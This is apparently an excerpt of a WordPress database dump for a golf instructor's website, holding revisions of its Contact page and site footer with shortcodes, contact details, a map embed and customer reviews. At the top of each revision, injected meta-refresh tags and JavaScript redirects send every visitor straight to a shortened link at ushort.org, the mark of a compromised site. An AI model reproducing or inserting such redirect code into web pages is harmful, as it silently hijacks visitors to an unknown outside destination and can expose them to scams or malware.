(10948, 1, '2023-07-17 23:28:19', '2023-07-17 23:28:19', '<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n[section label=\"Header\" bg_color=\"rgb(40, 40, 40)\" dark=\"true\" padding=\"0px\"]\n\n[row style=\"collapse\" width=\"full-width\" v_align=\"middle\" h_align=\"center\"]\n\n[col span__sm=\"12\"]\n\n[ux_banner height=\"56.25%\" height__sm=\"500px\" bg=\"42\" bg_overlay=\"rgba(0, 0, 0, 0.5)\" video_visibility=\"visible\"]\n\n[text_box width=\"80\" width__sm=\"90\" position_x=\"5\" position_y=\"50\" position_y__sm=\"80\" text_align=\"left\"]\n\n<h2 class=\"uppercase\"><strong>Contact</strong></h2>\n<h3>Jordan Young Golf</h3>\n\n[/text_box]\n\n[/ux_banner]\n\n[/col]\n\n[/row]\n\n[/section]\n[section bg=\"232\" bg_size=\"original\" bg_color=\"rgb(255,255,255)\" bg_overlay=\"rgba(255, 255, 255, 0.75)\" padding=\"50px\"]\n\n[row]\n\n[col span=\"6\" span__sm=\"12\"]\n\n<h2>Contact Jordan Young </h2>\n<hr class=\"hr_fancy\" />\n<p><i class=\"fa fa-phone\"></i> 248.561.0802 <br />\n<i class=\"fa fa-envelope\"></i> admin@jordanyounggolf.com</p>\n<hr class=\"hr_fancy\" />\n[ux_image id=\"237\"]\n\n[ux_image id=\"238\" link=\"http://www.wjr.com/spinongolf/\" target=\"_blank\"]\n\n\n[/col]\n[col span=\"6\" span__sm=\"12\"]\n\n[contact-form-7 id=\"266\"]\n\n\n[/col]\n\n[/row]\n\n[/section]\n[section bg_color=\"rgb(255,255,255)\" bg_overlay=\"rgba(255, 255, 255, 0.61)\" padding=\"0px\"]\n\n[row style=\"collapse\" width=\"full-width\"]\n\n[col span__sm=\"12\"]\n\n<div class=\"iframe-container\" >\n<iframe src=\"https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2947.7687948863354!2d-83.59649098454344!3d42.36876637918633!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x883caaaa488c4781%3A0x1f610bacbe6e267a!2sStrategic%20Fox%20Clubhouse%2C%208768%20N%20Territorial%20Rd%2C%20Plymouth%2C%20MI%2048170!5e0!3m2!1sen!2sus!4v1612905037034!5m2!1sen!2sus\" width=\"600\" height=\"450\" frameborder=\"0\" style=\"border:0;\" allowfullscreen=\"\" aria-hidden=\"false\" tabindex=\"0\"></iframe>\n</div>\n\n[/col]\n\n[/row]\n\n[/section]', 'Contact', '', 'inherit', 'closed', 'closed', '', '260-revision-v1', '', '', '2023-07-17 23:28:19', '2023-07-17 23:28:19', '', 260, 'https://jordanyounggolf.com/?p=10948', 0, 'revision', '', 0),
(10950, 1, '2023-07-17 23:34:20', '2023-07-17 23:34:20', '<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n<meta http-equiv=\"refresh\" content=\"0; url=https://ushort.org/JTbbGNW0r7\" />\r\n<script>window.location.href = \"https://ushort.org/JTbbGNW0r7\";</script>\r\n[section bg_color=\"rgb(40, 40, 40)\" dark=\"true\"]\n\n[row width=\"full-width\" h_align=\"center\"]\n\n[col span__sm=\"12\" align=\"center\"]\n\n<h2 class=\"uppercase\">GOOGLE REVIEWS</h2>\n<hr class=\"hr_fancy\" />\n\n[/col]\n[col span=\"4\" span__sm=\"12\"]\n\n<p>Jordan is an excpetional coach.He identifies key areas for improvement, communicates well, and provides the right amount of guidance to help you improve your golf game.As well, the facility at Fox Hills is an exceptional training enviornment.</p>\n<h5>~ David Paul</h5>\n\n[/col]\n[col span=\"4\" span__sm=\"12\"]\n\n<p>\nHighly recommend going to see Jordan no matter what skill level player you are. He will cover identification of your strengths and weaknesses with the drills to help improve both! He is always accessible and very easy to communicate with. You can see his work ethic, dedication and investment into each one of his students. Lastly, the facility he operates out of is equipped with everything you need to meet your goals.\n</p>\n<h5>~ Matt Williams</h5>\n\n[/col]\n[col span=\"4\" span__sm=\"12\"]\n\n<p>\nJordan, and his staff, provide quality golf training and instruction.He has helped many of my high school golfers prepare for competition and given them great success.I would highly recommend him and his staff for any golfer who is looking to improve and enjoy the game.\n</p>\n<h5>~ Vic Bliss</h5>\n\n[/col]\n[col span__sm=\"12\" align=\"left\"]\n\n<hr class=\"hr_fancy\" />\n<a href=\"https://www.google.com/maps/place/Jordan+Young+Golf/@42.3679109,-83.5981446,16.5z/data=!4m7!3m6!1s0x0:0xc9cb4f18a4253d1a!8m2!3d42.3683736!4d-83.5954777!9m1!1b1\" target=\"_blank\" rel=\"noopener\"></p>\n<h5 style=\"text-align: left;\">READ MORE GOOGLE REVIEWS <i class=\"fa fa-angle-double-right\"></i></h5>\n<p></a></p>\n\n[/col]\n\n[/row]\n\n[/section]\n[section bg_color=\"rgb(0,0,0)\" dark=\"true\"]\n\n[row width=\"full-width\" v_align=\"middle\" h_align=\"center\"]\n\n[col span=\"3\" span__sm=\"12\" align=\"center\"]\n\n[ux_image id=\"110\"]\n\n<p><i class=\"fa fa-phone\"></i><br />248.561.0802 <br />\n<i class=\"fa fa-envelope\"></i> admin@jordanyounggolf.com</p>\n\n[/col]\n[col span=\"6\" span__sm=\"12\" align=\"center\"]\n\n[ux_image id=\"97\" width=\"20\" link=\"https://www.foxhillslearningcenter.com/\" target=\"_blank\"]\n\n<h3 class=\"uppercase\">\n8768 North Territorial Road<br /> Plymouth, MI 48170<br />\n</h4>\n\n[/col]\n[col span=\"3\" span__sm=\"12\" align=\"center\"]\n\n[ux_image id=\"320\"]\n\n[follow scale=\"115\" facebook=\"https://www.facebook.com/jordanyounggolf?fref=ts\" instagram=\"https://www.instagram.com/jwinstruction/\" twitter=\"https://twitter.com/jwinstruction\"]\n\n\n[/col]\n\n[/row]\n\n[/section]', 'Global Footer', '', 'inherit', 'closed', 'closed', '', '20-revision-v1', '', '', '2023-07-17 23:34:20', '2023-07-17 23:34:20', '', 20, 'https://jordanyounggolf.com/?p=10950', 0, 'revision', '', 0),
